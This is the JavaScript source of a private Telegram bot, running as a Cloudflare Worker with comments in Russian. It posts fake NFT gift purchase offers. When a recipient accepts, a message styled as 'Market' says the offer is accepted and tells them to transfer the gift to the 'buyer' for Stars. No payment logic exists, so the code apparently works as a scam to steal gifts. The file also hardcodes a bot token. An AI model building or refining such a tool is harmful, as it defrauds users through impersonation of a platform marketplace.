const ADMIN_ID = 5151757168; // Ваш ID
const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew"; // ВСТАВЬТЕ ВАШ ТОКЕН!

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") {
      return new Response("OK", { status: 200 });
    }

    try {
      const update = await request.json();
      
      const kv = env.USERS_KV;
      if (!kv) console.error("ВНИМАНИЕ: База данных USERS_KV не привязана!");

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        if (username && kv) await kv.put(`username:${username.toLowerCase()}`, userId.toString());

        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = "🔒 <b>Доступ закрыт.</b>\n\nЭтот бот приватный.\nОбратитесь к владельцу (@gwrex).\n\nВаш ID: <code>" + userId + "</code>";
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n⏳ <b>Доступ:</b> ∞ бессрочно\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/ViceCream-355398 300 stars</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- /add ---
      if (update.message && update.message.text.startsWith("/add ")) {
        const senderId = update.message.from.id;
        if (senderId === ADMIN_ID && kv) {
          let target = update.message.text.split(" ")[1].trim();
          if (target.startsWith("@")) {
            const uname = target.slice(1).toLowerCase();
            const foundId = await kv.get(`username:${uname}`);
            if (foundId) {
              await kv.put(`user:${foundId}`, "true");
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.`, parse_mode: "HTML" });
            } else {
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден.\nПопросите его нажать /start.`, parse_mode: "HTML" });
            }
          } else {
            await kv.put(`user:${target}`, "true");
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.`, parse_mode: "HTML" });
          }
        }
      }

      // --- INLINE ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        const parts = iq.query.split(" ");
        if (parts.length >= 3) {
          const giftLink = parts[0];
          const amount = parts[1];
          const currency = parts[2];

          // Берем имя из профиля
          let senderName = iq.from.first_name || "";
          if (iq.from.last_name) senderName += " " + iq.from.last_name;
          if (!senderName && iq.from.username) senderName = "@" + iq.from.username;

          const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\nОффер действителен ещё 5 ч. 59 мин..`;

          const results = [{
            type: "article",
            id: "1",
            title: `Оффер от ${senderName}`,
            description: `За ${amount} ${currency}`,
            input_message_content: { message_text: text, parse_mode: "HTML" },
            reply_markup: {
              inline_keyboard: [
                // Передаем имя подарка в callback_data, чтобы знать, что приняли
                [{ text: "✅ Принять", callback_data: "accept|" + giftLink + "|" + amount + "|" + senderName }],
                [{ text: "❌ Отклонить", callback_data: "decline" }]
              ]
            }
          }];

          await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
        }
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const data = cq.data;
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;

        // ЕСЛИ ПРИНЯТЬ
        if (data.startsWith("accept|")) {
          // Разбираем данные из кнопки: [1] - ссылка, [2] - сумма, [3] - имя
          const splitData = data.split("|");
          const giftLink = splitData[1];
          const amount = splitData[2];
          const senderName = splitData[3];

          // 1. Выскакивает всплывающее окно (как на фото 2)
          const alertText = `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐ Stars`;
          await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: alertText, show_alert: true });

          // 2. Меняем сообщение (как на фото 2)
          const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐ Stars.`;
          
          // Создаем кнопку со ссылкой (синяя стрелочка, как на фото)
          const newMarkup = { 
            inline_keyboard: [
              [{ text: "Передать NFT ↗", url: "https://t.me/" + senderName.replace("@", "") }] 
            ] 
          };
          
          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
        } 
        
        // ЕСЛИ ОТКЛОНИТЬ
        else if (data === "decline") {
          // 1. Убираем "часики" загрузки (без всплывающего окна)
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });

          // 2. Меняем сообщение (как на фото 5)
          const newText = `× Оффер отклонён.`;
          
          // Оставляем кнопки пустыми
          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] } });
        } 
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
  return response.json();
}